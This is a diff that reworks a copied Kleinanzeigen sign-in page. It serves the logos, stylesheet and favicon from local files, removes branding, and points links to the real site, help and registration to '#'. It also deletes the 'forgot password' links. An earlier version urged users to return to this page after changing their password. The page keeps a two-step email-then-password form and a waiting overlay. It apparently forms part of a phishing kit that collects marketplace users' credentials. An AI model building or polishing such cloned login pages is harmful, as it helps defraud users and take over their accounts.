@@ -9,8 +9,8 @@ body[unresolved] { opacity: 0; display: block; overflow: hidden; position: relat
   var html = document.documentElement;
   var initialScheme = html.getAttribute("data-color-scheme");
   var illustrationUrl = html.getAttribute("data-illustration");
-  var LOGO_DARK = "https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-dark-mode.svg";
-  var LOGO_LIGHT = "https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-horizontal.svg";
+  var LOGO_DARK = "/klein-local-logo.png";
+  var LOGO_LIGHT = "/klein-local-logo.png";
   var updateLogos = function (isDark) {
     var headerLogo = document.querySelector(".knz-header__logo-img");
     var centerLogo = document.getElementById("prompt-logo-center");
@@ -51,7 +51,7 @@ body[unresolved] { opacity: 0; display: block; overflow: hidden; position: relat
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="ulp-version" content="1.101.5">
 <meta name="robots" content="noindex, nofollow">
-<link rel="stylesheet" href="https://cdn.auth0.com/ulp/react-components/1.178.5/css/main_wcag_compliant.cdn.min.css">
+<link rel="stylesheet" href="/ulp-klein-auth0.css">
 <style id="custom-styles-container">
 :root, .af-custom-form-container .af-form { --primary-color: #B5E941; }
 :root, .af-custom-form-container .af-form { --button-font-color: #1D4B00; }
@@ -115,9 +115,8 @@ body { --ulp-label-font-size: 0.875rem; --ulp-label-font-weight: var(--font-defa
 .no-js-container { width: var(--prompt-width); }
 </style>
 </noscript>
-<link rel="icon" href="https://www.kleinanzeigen.de/favicon.ico" sizes="32x32">
-<link rel="icon" href="https://www.kleinanzeigen.de/favicon.svg" type="image/svg+xml">
-<title>Kleinanzeigen - Anmelden</title>
+<link rel="icon" href="/klein-favicon.png" type="image/png" sizes="32x32">
+<title>Anmelden</title>
 <style>
 :root {
   --font-family: "Helvetica Neue", Helvetica, Arial, sans-serif !important;
@@ -129,7 +128,7 @@ body { --ulp-label-font-size: 0.875rem; --ulp-label-font-weight: var(--font-defa
   -webkit-color-scheme: light;
   -moz-color-scheme: light;
   --page-background-color: #ffffff;
-  --lock-icon-bg: url("https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-bimi-green.svg");
+  --lock-icon-bg: url("/klein-lock-light.svg");
   --error-icon-bg: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='none'><path d='M11 10C11 9.44772 11.4477 9 12 9 12.5523 9 13 9.44772 13 10V14C13 14.5523 12.5523 15 12 15 11.4477 15 11 14.5523 11 14V10ZM13 17C13 17.5523 12.5523 18 12 18 11.4477 18 11 17.5523 11 17 11 16.4477 11.4477 16 12 16 12.5523 16 13 16.4477 13 17Z' fill='%23D63A3A'/><path fill-rule='evenodd' clip-rule='evenodd' d='M11.1345 3.49481C11.5197 2.82953 12.4802 2.82953 12.8654 3.49481L22.1309 19.499C22.5169 20.1656 22.0358 21 21.2655 21H2.73441C1.96407 21 1.48302 20.1656 1.86898 19.499L11.1345 3.49481ZM4.46885 19L12 5.99171L19.5311 19H4.46885Z' fill='%23B30C0C'/></svg>");
 }
 :root[data-color-scheme="dark"] {
@@ -156,10 +155,10 @@ body { --ulp-label-font-size: 0.875rem; --ulp-label-font-weight: var(--font-defa
   --error-color: #ff5a5f;
   --success-color: #4ade80;
   --ulp-captcha-widget-theme: dark;
-  --lock-icon-bg: url("https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-bimi.svg");
+  --lock-icon-bg: url("/klein-lock-dark.svg");
   --error-icon-bg: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='none'><path d='M11 10C11 9.44772 11.4477 9 12 9 12.5523 9 13 9.44772 13 10V14C13 14.5523 12.5523 15 12 15 11.4477 15 11 14.5523 11 14V10ZM13 17C13 17.5523 12.5523 18 12 18 11.4477 18 11 17.5523 11 17 11 16.4477 11.4477 16 12 16 12.5523 16 13 16.4477 13 17Z' fill='%23ff5a5f'/><path fill-rule='evenodd' clip-rule='evenodd' d='M11.1345 3.49481C11.5197 2.82953 12.4802 2.82953 12.8654 3.49481L22.1309 19.499C22.5169 20.1656 22.0358 21 21.2655 21H2.73441C1.96407 21 1.48302 20.1656 1.86898 19.499L11.1345 3.49481ZM4.46885 19L12 5.99171L19.5311 19H4.46885Z' fill='%23ff5a5f'/></svg>");
-}
-:root[data-color-scheme="dark"] .knz-header { border-bottom: 1px solid #555555; }
+  }
+  :root[data-color-scheme="dark"] .knz-header { border-bottom: 1px solid #555555; }
 @media (prefers-color-scheme: dark) {
   :root[data-color-scheme="system"] {
     color-scheme: dark;
@@ -183,7 +182,7 @@ body { --ulp-label-font-size: 0.875rem; --ulp-label-font-weight: var(--font-defa
     --error-color: #ff5a5f;
     --success-color: #4ade80;
     --ulp-captcha-widget-theme: dark;
-    --lock-icon-bg: url("https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-bimi.svg");
+    --lock-icon-bg: url("/klein-lock-dark.svg");
     --error-icon-bg: url("data:image/svg+xml;utf8,<svg viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg' fill='none'><path d='M11 10C11 9.44772 11.4477 9 12 9 12.5523 9 13 9.44772 13 10V14C13 14.5523 12.5523 15 12 15 11.4477 15 11 14.5523 11 14V10ZM13 17C13 17.5523 12.5523 18 12 18 11.4477 18 11 17.5523 11 17 11 16.4477 11.4477 16 12 16 12.5523 16 13 16.4477 13 17Z' fill='%23ff5a5f'/><path fill-rule='evenodd' clip-rule='evenodd' d='M11.1345 3.49481C11.5197 2.82953 12.4802 2.82953 12.8654 3.49481L22.1309 19.499C22.5169 20.1656 22.0358 21 21.2655 21H2.73441C1.96407 21 1.48302 20.1656 1.86898 19.499L11.1345 3.49481ZM4.46885 19L12 5.99171L19.5311 19H4.46885Z' fill='%23ff5a5f'/></svg>");
   }
   :root[data-color-scheme="dark"] .knz-header { border-bottom: 1px solid #555555; }
@@ -215,6 +214,17 @@ html[data-illustration]:not([data-illustration=""]) #prompt-logo-center {
 #custom-prompt-logo:empty,
 #custom-prompt-logo[style*="transparent"] { display: none !important; }
 main._widget { min-height: fit-content !important; }
+/* Sichtbarkeit, falls Stylesheet verzögert oder blockiert wird */
+body._widget-auto-layout main._widget.login-id {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  min-height: 70vh;
+  box-sizing: border-box;
+  padding: 24px 16px;
+}
 </style>
 <style>
 .knz-header {
@@ -357,10 +367,10 @@ main._widget { min-height: fit-content !important; }
         <path stroke="currentColor" stroke-linecap="round" stroke-width="1.5" d="M7.5 2 4 6l3.5 4"></path>
       </svg>
     </a>
-    <a href="https://www.kleinanzeigen.de" class="knz-header__logo-link">
-      <img class="knz-header__logo-img" src="https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-horizontal.svg" alt="Kleinanzeigen">
+    <a href="#" class="knz-header__logo-link" id="knz-header-logo" aria-label="Start">
+      <img class="knz-header__logo-img" src="/klein-local-logo.png" alt="">
     </a>
-    <a href="https://hilfe.kleinanzeigen.de/hc/de" target="_blank" rel="noopener" class="knz-header__help-link">Hilfe</a>
+    <a href="#" class="knz-header__help-link" id="knz-header-help">Hilfe</a>
   </header>
 
   <main class="_widget login-id">
@@ -368,11 +378,11 @@ main._widget { min-height: fit-content !important; }
       <div class="cd88e52ad cf242c171">
         <div class="cfc330a74 c3f1d1330">
           <header class="c830ffe82 c13641cb1">
-            <div title="kleinanzeigen.de" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important;"></div>
-            <img class="ce072b1c1 c14413795" id="prompt-logo-center" src="https://static.kleinanzeigen.de/static/img/common/logo/logo-kleinanzeigen-horizontal.svg" alt="kleinanzeigen.de" style="content: unset !important;">
-            <h1 class="c57a2b55e cebf149b0">Willkommen bei Kleinanzeigen!</h1>
+            <div title="" id="custom-prompt-logo" style="width: auto !important; height: 60px !important; position: static !important; margin: auto !important; padding: 0 !important; background-color: transparent !important; background-position: center !important; background-size: contain !important; background-repeat: no-repeat !important;"></div>
+            <img class="ce072b1c1 c14413795" id="prompt-logo-center" src="/klein-local-logo.png" alt="" style="content: unset !important;">
+            <h1 class="c57a2b55e cebf149b0">Willkommen!</h1>
             <div class="c43978590 c07798f9c">
-              <p class="c08c624ec c54badf1e">Gut für deinen Geldbeutel, gut für die Umwelt - jetzt einloggen.</p>
+              <p class="c08c624ec c54badf1e">Melde dich mit deiner E-Mail-Adresse und deinem Passwort an.</p>
             </div>
           </header>
 
@@ -392,7 +402,6 @@ main._widget { min-height: fit-content !important; }
                       </div>
                     </div>
                     <p id="knz-email-error" class="knz-email-error" role="alert" hidden></p>
-                    <div id="ulp-container-form-content-end"><p><a class="knz-passwort-vergessen" href="#" style="text-decoration: underline;">Passwort vergessen?</a></p></div>
                     <div class="c5a5c0c46">
                       <button type="submit" name="action" id="btn-weitermachen" value="default" class="c358eb6f9 c2ce9d437 c13132938 cd97f81f4 _button-login-id" data-action-button-primary="true">Weiter</button>
                     </div>
@@ -437,7 +446,6 @@ main._widget { min-height: fit-content !important; }
                         <span id="error-login"></span>
                       </span>
                     </div>
-                    <div class="knz-step2-forgot-wrap"><p><a class="knz-passwort-vergessen" href="#" style="text-decoration: underline;">Passwort vergessen?</a></p></div>
                     <div class="c5a5c0c46">
                       <button type="submit" name="action" value="default" id="main-action-button" class="c358eb6f9 c2ce9d437 c13132938 cd97f81f4 _button-login-password" data-action-button-primary="true">Einloggen</button>
                     </div>
@@ -451,22 +459,13 @@ main._widget { min-height: fit-content !important; }
             </div>
             <div id="ulp-container-form-footer-start">
               <p>&nbsp;</p>
-              <p>Noch nicht registriert? <a style="text-decoration: underline;" href="https://www.kleinanzeigen.de/m-benutzer-anmeldung.html">Erstelle ein Konto</a></p>
+              <p>Noch nicht registriert? <a href="#" id="knz-footer-reg" style="text-decoration: underline;">Erstelle ein Konto</a></p>
             </div>
           </div>
         </div>
       </div>
     </section>
   </main>
-
-  <div id="knz-redirect-overlay" class="knz-redirect-overlay" hidden aria-live="polite">
-    <div class="knz-redirect-box">
-      <h2>Passwort vergessen?</h2>
-      <p>Nach der Passwortänderung kehren Sie bitte unbedingt auf diese Seite zurück, um den Schutz Ihres Kontos zu gewährleisten.</p>
-      <p class="knz-redirect-countdown" id="knz-redirect-countdown">3</p>
-      <p style="font-size: 0.875rem; color: var(--font-light-color); margin-top: 8px;">Weiterleitung zur Passwortänderung …</p>
-    </div>
-  </div>
 
   <div id="knz-wait-overlay" class="knz-redirect-overlay" hidden aria-live="polite">
     <div class="knz-redirect-box">
